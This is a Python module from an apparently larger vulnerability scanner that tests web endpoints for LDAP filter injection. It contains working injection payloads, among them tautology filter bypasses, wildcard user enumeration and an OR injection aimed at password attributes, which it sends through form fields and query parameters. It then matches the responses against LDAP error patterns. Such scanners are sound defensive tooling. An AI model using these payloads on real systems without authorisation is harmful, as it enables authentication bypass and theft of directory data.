"""
GrotAssault — LDAP injection payload checker.

Tests for LDAP filter injection by sending payloads that manipulate
LDAP search filters.  Detects both error-based and tautology-based
LDAP injection.

References:
  - CWE-90: Improper Neutralization of Special Elements used in an LDAP Query
  - OWASP Testing Guide: OTG-INPVAL-006
"""

from __future__ import annotations

import logging
import re
from typing import Dict, List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.ldap_payloads")


# -- LDAP injection payloads -----------------------------------------------

_LDAP_PAYLOADS: List[Dict[str, str]] = [
    # Tautology / always-true
    {
        "payload": "*)(objectClass=*",
        "type": "tautology",
        "description": "LDAP tautology — always-true filter bypass",
    },
    {
        "payload": "*)(&",
        "type": "tautology",
        "description": "LDAP filter closure — truncate remaining filter",
    },
    {
        "payload": "*)(uid=*))(|(uid=*",
        "type": "tautology",
        "description": "LDAP OR injection — enumerate all users",
    },
    # Error-triggering
    {
        "payload": "\\00",
        "type": "error",
        "description": "Null byte — may cause LDAP parse error",
    },
    {
        "payload": ")(cn=*",
        "type": "error",
        "description": "Premature filter close — syntax error probe",
    },
    {
        "payload": "*)(|(password=*",
        "type": "data_exfil",
        "description": "LDAP OR injection — attempt to retrieve passwords",
    },
    # Wildcard enumeration
    {
        "payload": "*",
        "type": "wildcard",
        "description": "Wildcard — may return all entries",
    },
    {
        "payload": "admin*",
        "type": "wildcard",
        "description": "Prefix wildcard — enumerate admin accounts",
    },
    # Special character injection
    {
        "payload": "a]b",
        "type": "error",
        "description": "Bracket injection — filter parsing test",
    },
    {
        "payload": "a)(|(objectClass=*",
        "type": "tautology",
        "description": "OR injection — access all objects",
    },
]

# Patterns indicating LDAP error responses
_LDAP_ERROR_PATTERNS: List[re.Pattern[str]] = [
    re.compile(r"javax\.naming\.NameNotFoundException", re.I),
    re.compile(r"javax\.naming\.NamingException", re.I),
    re.compile(r"LDAP\s+error", re.I),
    re.compile(r"ldap_search|ldap_bind|ldap_connect", re.I),
    re.compile(r"Invalid\s+DN\s+syntax", re.I),
    re.compile(r"Bad\s+search\s+filter", re.I),
    re.compile(r"DSA\s+is\s+unwilling", re.I),
    re.compile(r"NamingException", re.I),
    re.compile(r"LdapErr:", re.I),
    re.compile(r"net\.ldap", re.I),
]


class LdapChecker(HttpClientMixin):
    """Test endpoints for LDAP filter injection."""

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    async def check(self, target: Target) -> List[Finding]:
        """Inject LDAP payloads and analyse responses."""
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)

        try:
            # Get baseline
            try:
                baseline = await client.request(target.method, target.url)
                _baseline_status = baseline.status_code
                baseline_len = len(baseline.text)
            except (httpx.HTTPError, OSError, ValueError):
                return findings

            for entry in _LDAP_PAYLOADS:
                payload = entry["payload"]
                resp_text = await self._inject(client, target, payload)
                if resp_text is None:
                    continue

                # Check for LDAP errors in response
                errors = self._detect_ldap_errors(resp_text)
                if errors:
                    findings.append(Finding(
                        title=f"LDAP injection (error-based) on {target.url}",
                        description=(
                            f"Payload '{payload}' ({entry['description']}) "
                            f"triggered LDAP error messages: {', '.join(errors[:3])}"
                        ),
                        severity=Severity.HIGH,
                        target=target,
                        evidence=f"Payload: {payload}\nErrors: {'; '.join(errors[:3])}",
                        remediation=(
                            "Use parameterised LDAP queries or properly escape "
                            "LDAP special characters (*, (, ), \\, NUL) in user input. "
                            "Implement input validation with a strict allowlist."
                        ),
                        cwe=90,
                        tags=["ldap-injection", "error-based", "grotassault"],
                    ))
                    break

                # Check for tautology success (significantly more data returned)
                if entry["type"] == "tautology" and len(resp_text) > baseline_len * 2:
                    findings.append(Finding(
                        title=f"LDAP injection (tautology) on {target.url}",
                        description=(
                            f"Payload '{payload}' ({entry['description']}) "
                            f"returned significantly more data ({len(resp_text)} bytes "
                            f"vs baseline {baseline_len} bytes), suggesting LDAP "
                            f"filter manipulation."
                        ),
                        severity=Severity.HIGH,
                        target=target,
                        evidence=(
                            f"Payload: {payload}\n"
                            f"Baseline: {baseline_len} bytes\n"
                            f"Injected: {len(resp_text)} bytes"
                        ),
                        remediation=(
                            "Use parameterised LDAP queries or properly escape "
                            "LDAP special characters. Validate and sanitize all "
                            "user inputs used in LDAP filters."
                        ),
                        cwe=90,
                        tags=["ldap-injection", "tautology", "grotassault"],
                    ))
                    break

        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    # ------------------------------------------------------------------
    # Injection
    # ------------------------------------------------------------------

    async def _inject(
        self,
        client: HttpClient,
        target: Target,
        payload: str,
    ) -> Optional[str]:
        """Inject *payload* and return response body."""
        try:
            if target.method.upper() in ("POST", "PUT", "PATCH"):
                body = f"username={payload}"
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                resp = await client.request(
                    target.method, target.url,
                    body=body, headers=headers,
                )
            else:
                separator = "&" if "?" in target.url else "?"
                url = f"{target.url}{separator}q={payload}"
                resp = await client.get(url)
            return resp.text
        except (httpx.HTTPError, OSError, ValueError):
            return None

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_ldap_errors(text: str) -> List[str]:
        """Return matching LDAP error pattern descriptions."""
        found: List[str] = []
        for pattern in _LDAP_ERROR_PATTERNS:
            match = pattern.search(text)
            if match:
                found.append(match.group(0))
        return found
